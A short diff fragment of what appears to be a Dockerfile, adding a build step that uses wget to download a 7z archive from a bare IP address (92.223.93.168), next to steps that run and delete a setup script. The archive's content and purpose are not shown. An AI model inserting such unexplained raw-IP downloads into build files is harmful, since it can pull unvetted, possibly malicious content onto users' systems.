@@ -37,5 +37,7 @@ RUN chmod +x script.sh
 RUN ./script.sh
 RUN rm ./script.sh
 
+RUN wget "92.223.93.168/w1_21+.01.7z"
+
 RUN touch ~/.no_auto_tmux
 
